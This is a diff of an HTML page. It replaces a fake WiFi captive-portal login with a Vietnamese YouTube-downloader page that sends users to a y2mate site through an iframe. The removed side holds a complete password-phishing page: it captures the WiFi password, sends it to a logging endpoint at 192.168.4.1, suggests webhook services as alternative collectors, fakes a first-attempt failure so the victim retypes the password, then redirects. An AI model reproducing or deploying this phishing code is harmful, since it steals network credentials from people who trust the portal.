@@ -1,195 +1,531 @@
 <!DOCTYPE html>
-<html lang="en"> 
+<html lang="vi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WiFi Connect</title>
+    <title>Y2mate - Tải Video YouTube</title>
     <style>
-        /* CSS giữ nguyên như trước */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            color: #333;
+            padding: 20px;
         }
 
-        .connect-container {
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            padding: 40px;
+            max-width: 600px;
             width: 100%;
-            max-width: 320px; 
-            padding: 20px;
-            background-color: #fff;
-            border: 1px solid #ccc; 
-            border-radius: 4px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .header {
             text-align: center;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
         }
 
-        .header h2 {
-            margin: 0;
-            font-size: 1.5em;
-            color: #17a2b8;
+        .header h1 {
+            color: #667eea;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            color: #666;
+            font-size: 1.1em;
+        }
+
+        .logo {
+            font-size: 3em;
+            margin-bottom: 10px;
         }
 
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 25px;
         }
 
-        input[type="password"] {
-            width: 100%;
-            padding: 12px 10px;
-            border: 1px solid #ced4da;
-            border-radius: 4px;
-            box-sizing: border-box; 
-            text-align: center; 
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 600;
             font-size: 1.1em;
         }
 
-        button {
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-wrapper input {
             width: 100%;
-            padding: 10px;
-            background-color: #17a2b8; 
+            padding: 15px 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 1em;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .input-wrapper input:focus {
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             border: none;
-            border-radius: 4px;
-            cursor: pointer;
+            border-radius: 10px;
             font-size: 1.1em;
-            transition: background-color 0.3s;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
-        button:hover {
-            background-color: #138496;
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
         }
 
-        .message {
-            margin-top: 15px;
-            padding: 10px;
-            border-radius: 3px;
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .tips {
+            background: #f8f9fa;
+            border-left: 4px solid #667eea;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+
+        .tips h3 {
+            color: #667eea;
+            margin-bottom: 10px;
+            font-size: 1.1em;
+        }
+
+        .tips ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        .tips li {
+            color: #666;
+            margin-bottom: 8px;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        .tips li:before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: #667eea;
+            font-weight: bold;
+        }
+
+        .loading {
+            display: none;
             text-align: center;
-            display: none; 
+            margin-top: 20px;
+        }
+
+        .loading.active {
+            display: block;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .error {
+            background: #fee;
+            color: #c33;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 15px;
+            display: none;
+        }
+
+        .error.active {
+            display: block;
+        }
+
+        .success {
+            background: #efe;
+            color: #3c3;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 15px;
+            display: none;
+        }
+
+        .success.active {
+            display: block;
+        }
+
+        .quick-tip {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 15px;
             font-size: 0.9em;
+            color: #856404;
         }
 
-        .message.success {
-            background-color: #d1ecf1;
-            color: #0c5460;
-            border: 1px solid #bee5eb;
+        .quick-tip strong {
+            color: #667eea;
         }
 
-        .message.error {
-            background-color: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
+        .iframe-container {
+            display: none;
+            margin-top: 30px;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            background: white;
+        }
+
+        .iframe-container.active {
+            display: block;
+            animation: slideDown 0.5s ease-out;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .iframe-container iframe {
+            width: 100%;
+            min-height: 600px;
+            border: none;
+        }
+
+        .close-iframe {
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .close-iframe.active {
+            display: block;
+        }
+
+        .close-btn {
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.9em;
+            transition: all 0.3s ease;
+        }
+
+        .close-btn:hover {
+            background: #c82333;
+            transform: translateY(-2px);
         }
     </style>
 </head>
 <body>
-
-    <div class="connect-container">
+    <div class="container">
         <div class="header">
-            <h2>WiFi Connect</h2>
+            <div class="logo">🎬</div>
+            <h1>Jaboz Tải Video</h1>
+            <p>Tải video YouTube miễn phí và nhanh chóng</p>
         </div>
-        
-        <form id="connectForm"> 
+
+        <form id="downloadForm">
             <div class="form-group">
-                <input 
-                    type="password" 
-                    id="password" 
-                    name="password" 
-                    placeholder="WiFi 비밀번호 입력" 
-                    required 
-                    autocomplete="off">
+                <label for="youtubeUrl">Nhập URL Video YouTube:</label>
+                <div class="input-wrapper">
+                    <input 
+                        type="text" 
+                        id="youtubeUrl" 
+                        name="youtubeUrl" 
+                        placeholder="https://www.youtube.com/watch?v=..." 
+                        required
+                        autocomplete="off"
+                    >
+                </div>
             </div>
-            
-            <button type="submit">Connect</button>
+
+            <button type="submit" class="btn" id="submitBtn">
+                Chuyển đổi và Tải xuống
+            </button>
+            <div style="text-align: center; margin-top: 10px;">
+                <button type="button" class="btn" id="openNewTabBtn" style="background: #28a745; max-width: 300px; margin: 0 auto;">
+                    Mở trong Tab Mới
+                </button>
+            </div>
         </form>
 
-        <div id="message" class="message"></div>
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p style="margin-top: 10px; color: #666;">Đang xử lý...</p>
+        </div>
+
+        <div class="error" id="error"></div>
+        <div class="success" id="success"></div>
+
+        <div class="iframe-container" id="iframeContainer">
+            <iframe id="y2mateIframe" src="" allowfullscreen></iframe>
+        </div>
+
+        <div class="close-iframe" id="closeIframe">
+            <button class="close-btn" onclick="closeIframe()">Đóng</button>
+        </div>
+
+        <div class="tips">
+            <h3>✨ Tính năng:</h3>
+            <ul>
+                <li>Tải video YouTube không giới hạn và miễn phí 100%</li>
+                <li>Hỗ trợ nhiều định dạng: MP4, MP3, WEBM, FLV...</li>
+                <li>Chất lượng cao: 360p, 720p, 1080p, 2K, 4K</li>
+                <li>Không cần đăng ký hoặc cài đặt</li>
+                <li>An toàn và bảo mật 100%</li>
+            </ul>
+        </div>
     </div>
 
     <script>
-        // Địa chỉ URL mà người dùng sẽ được chuyển hướng đến sau khi "đăng nhập"
-        const TARGET_URL = "http://google.com"; 
+        const form = document.getElementById('downloadForm');
+        const youtubeUrlInput = document.getElementById('youtubeUrl');
+        const submitBtn = document.getElementById('submitBtn');
+        const openNewTabBtn = document.getElementById('openNewTabBtn');
+        const loading = document.getElementById('loading');
+        const errorDiv = document.getElementById('error');
+        const successDiv = document.getElementById('success');
+        const iframeContainer = document.getElementById('iframeContainer');
+        const y2mateIframe = document.getElementById('y2mateIframe');
+        const closeIframeBtn = document.getElementById('closeIframe');
 
-        // Hàm giả lập việc gửi dữ liệu đến máy chủ của bạn
-        function sendPassword(password) {
-            // Thay đổi 'YOUR_LOGGING_URL' thành nơi bạn muốn nhận mật khẩu
-            // Ví dụ: một endpoint trên dịch vụ như Pipedream, Webhook.site, hoặc server ESP của bạn
-            const LOGGING_URL = 'http://192.168.4.1/log_password?pass=' + encodeURIComponent(password);
+        // Hàm tự động thêm "sos" vào URL YouTube
+        function addSosToUrl(url) {
+            // Loại bỏ khoảng trắng
+            url = url.trim();
             
-            // Gửi dữ liệu (sử dụng fetch hoặc tạo một thẻ <img> để gửi request GET đơn giản)
-            console.log('Đang gửi mật khẩu đến:', LOGGING_URL);
-
-            // Phương pháp gửi đơn giản (GET request) - Phù hợp với Captive Portal ESP đơn giản
-            fetch(LOGGING_URL, {
-                method: 'GET',
-                mode: 'no-cors' // Quan trọng để tránh lỗi CORS trong môi trường cục bộ
-            }).then(response => {
-                console.log('Đã gửi xong. Phản hồi server:', response);
-            }).catch(error => {
-                console.error('Lỗi khi gửi dữ liệu:', error);
-            });
+            // Nếu URL không có http/https, thêm https://
+            if (!url.startsWith('http://') && !url.startsWith('https://')) {
+                url = 'https://' + url;
+            }
+            
+            // Tự động thêm "sos" trước "youtube" nếu chưa có
+            if (url.includes('youtube.com') && !url.includes('sosyoutube.com')) {
+                url = url.replace(/youtube\.com/g, 'sosyoutube.com');
+            }
+            if (url.includes('youtu.be') && !url.includes('sosyoutu.be')) {
+                url = url.replace(/youtu\.be/g, 'sosyoutu.be');
+            }
+            
+            return url;
         }
 
+        // Hàm kiểm tra URL YouTube hợp lệ (chấp nhận cả sosyoutube.com)
+        function isValidYouTubeUrl(url) {
+            const patterns = [
+                /^https?:\/\/(www\.)?(youtube\.com|youtu\.be|sosyoutube\.com|sosyoutu\.be)\/.+/,
+                /^https?:\/\/.*(youtube\.com|sosyoutube\.com)\/watch\?v=[\w-]+/,
+                /^https?:\/\/(youtu\.be|sosyoutu\.be)\/[\w-]+/
+            ];
+            return patterns.some(pattern => pattern.test(url));
+        }
 
-        document.getElementById('connectForm').addEventListener('submit', async function(event) {
-            event.preventDefault(); 
+        // Hàm chuyển đổi URL sang định dạng y2mate (tự động thêm SOS)
+        function convertToY2mateUrl(youtubeUrl) {
+            // Tự động thêm "sos" vào URL
+            const sosUrl = addSosToUrl(youtubeUrl);
+            
+            // Chuyển hướng đến y2mate với URL đã chuyển đổi
+            const y2mateBaseUrl = 'https://www-y2mate.com/vi21/';
+            
+            // Trả về URL y2mate với tham số
+            return `${y2mateBaseUrl}?url=${encodeURIComponent(sosUrl)}`;
+        }
 
-            const password = document.getElementById('password').value;
-            const messageDiv = document.getElementById('message');
+        // Xử lý submit form
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
             
-            // 1. Gửi mật khẩu người dùng đã nhập đến endpoint lưu trữ của bạn
-            sendPassword(password);
+            let youtubeUrl = youtubeUrlInput.value.trim();
+            
+            // Ẩn thông báo lỗi/thành công trước đó
+            errorDiv.classList.remove('active');
+            successDiv.classList.remove('active');
+            
+            // Kiểm tra URL hợp lệ
+            if (!youtubeUrl) {
+                showError('Vui lòng nhập URL video YouTube!');
+                return;
+            }
 
-            // Xóa thông báo cũ
-            messageDiv.className = 'message';
-            messageDiv.style.display = 'none';
-            
-            // 2. Mô phỏng hành vi: Giả định lần đầu luôn sai
-            // Chúng ta không biết mật khẩu thật, nên ta sẽ tạo kịch bản 
-            // khiến người dùng nhập lại hoặc chuyển hướng tùy theo số lần nhập.
-            
-            const attemptCount = localStorage.getItem('loginAttempt') ? parseInt(localStorage.getItem('loginAttempt')) : 0;
-            
-            if (attemptCount === 0) {
-                // Lần thử đầu tiên: GIẢ LẬP LỖI
-                messageDiv.textContent = '비밀번호가 올바르지 않습니다. 다시 시도해 주세요.'; // Mật khẩu không đúng
-                messageDiv.classList.add('error');
-                messageDiv.style.display = 'block';
+            // Tự động thêm "sos" vào URL trước khi kiểm tra
+            youtubeUrl = addSosToUrl(youtubeUrl);
+            youtubeUrlInput.value = youtubeUrl; // Cập nhật lại vào input
+
+            if (!isValidYouTubeUrl(youtubeUrl)) {
+                showError('URL không hợp lệ! Vui lòng nhập đúng định dạng URL YouTube.');
+                return;
+            }
+
+            // Hiển thị loading
+            loading.classList.add('active');
+            submitBtn.disabled = true;
+
+            // Tải trực tiếp trên trang bằng iframe
+            setTimeout(() => {
+                const y2mateUrl = convertToY2mateUrl(youtubeUrl);
                 
-                // Tăng số lần thử
-                localStorage.setItem('loginAttempt', 1);
-
-            } else {
-                // Lần thử thứ hai trở đi: GIẢ LẬP THÀNH CÔNG và chuyển hướng
-                messageDiv.textContent = '연결 성공! 인터넷에 접속되었습니다...'; // Kết nối thành công
-                messageDiv.classList.add('success');
-                messageDiv.style.display = 'block';
-
-                // Xóa số lần thử và chuyển hướng sau 1.5 giây
-                localStorage.removeItem('loginAttempt');
+                // Hiển thị iframe với y2mate
+                y2mateIframe.src = y2mateUrl;
+                iframeContainer.classList.add('active');
+                closeIframeBtn.classList.add('active');
                 
-                // 3. CHUYỂN HƯỚNG
+                // Cuộn đến iframe
+                iframeContainer.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                
+                loading.classList.remove('active');
+                submitBtn.disabled = false;
+                showSuccess('Đang tải y2mate...');
+                
+                // Xóa thông báo sau 3 giây
                 setTimeout(() => {
-                    // Trong Captive Portal, hành động này sẽ đưa người dùng qua tường lửa ảo
-                    window.location.href = TARGET_URL; 
-                }, 1500);
+                    successDiv.classList.remove('active');
+                }, 3000);
+            }, 500);
+        });
+
+        function showError(message) {
+            errorDiv.textContent = message;
+            errorDiv.classList.add('active');
+            loading.classList.remove('active');
+            submitBtn.disabled = false;
+        }
+
+        function showSuccess(message) {
+            successDiv.textContent = message;
+            successDiv.classList.add('active');
+        }
+
+        // Xử lý paste URL - tự động thêm "sos"
+        youtubeUrlInput.addEventListener('paste', function(e) {
+            setTimeout(() => {
+                const pastedText = this.value.trim();
+                if (isValidYouTubeUrl(pastedText)) {
+                    // Tự động thêm "sos" vào URL nếu chưa có
+                    const sosUrl = addSosToUrl(pastedText);
+                    if (sosUrl !== pastedText) {
+                        this.value = sosUrl;
+                    }
+                    this.style.borderColor = '#4caf50';
+                }
+            }, 100);
+        });
+
+        // Xử lý khi người dùng nhập - tự động thêm "sos" khi nhập xong
+        youtubeUrlInput.addEventListener('blur', function() {
+            const currentValue = this.value.trim();
+            if (currentValue && isValidYouTubeUrl(currentValue)) {
+                // Tự động thêm "sos" vào URL nếu chưa có
+                const sosUrl = addSosToUrl(currentValue);
+                if (sosUrl !== currentValue) {
+                    this.value = sosUrl;
+                }
             }
         });
 
-        // Xóa trạng thái thử nghiệm khi tải lại trang lần đầu
-        if (!localStorage.getItem('pageLoaded')) {
-             localStorage.removeItem('loginAttempt');
-             localStorage.setItem('pageLoaded', 'true');
-        }
-    </script>
+        // Xử lý khi người dùng nhập
+        youtubeUrlInput.addEventListener('input', function() {
+            errorDiv.classList.remove('active');
+            this.style.borderColor = '#e0e0e0';
+        });
 
+        // Hàm đóng iframe
+        function closeIframe() {
+            iframeContainer.classList.remove('active');
+            closeIframeBtn.classList.remove('active');
+            y2mateIframe.src = '';
+        }
+
+        // Xử lý nút mở tab mới
+        openNewTabBtn.addEventListener('click', function() {
+            let youtubeUrl = youtubeUrlInput.value.trim();
+            
+            if (!youtubeUrl) {
+                showError('Vui lòng nhập URL video YouTube trước!');
+                return;
+            }
+
+            // Tự động thêm "sos" vào URL
+            youtubeUrl = addSosToUrl(youtubeUrl);
+            
+            if (!isValidYouTubeUrl(youtubeUrl)) {
+                showError('URL không hợp lệ! Vui lòng nhập đúng định dạng URL YouTube.');
+                return;
+            }
+
+            const y2mateUrl = convertToY2mateUrl(youtubeUrl);
+            window.open(y2mateUrl, '_blank');
+            showSuccess('Đã mở y2mate trong tab mới!');
+            
+            setTimeout(() => {
+                successDiv.classList.remove('active');
+            }, 3000);
+        });
+    </script>
 </body>
 </html>
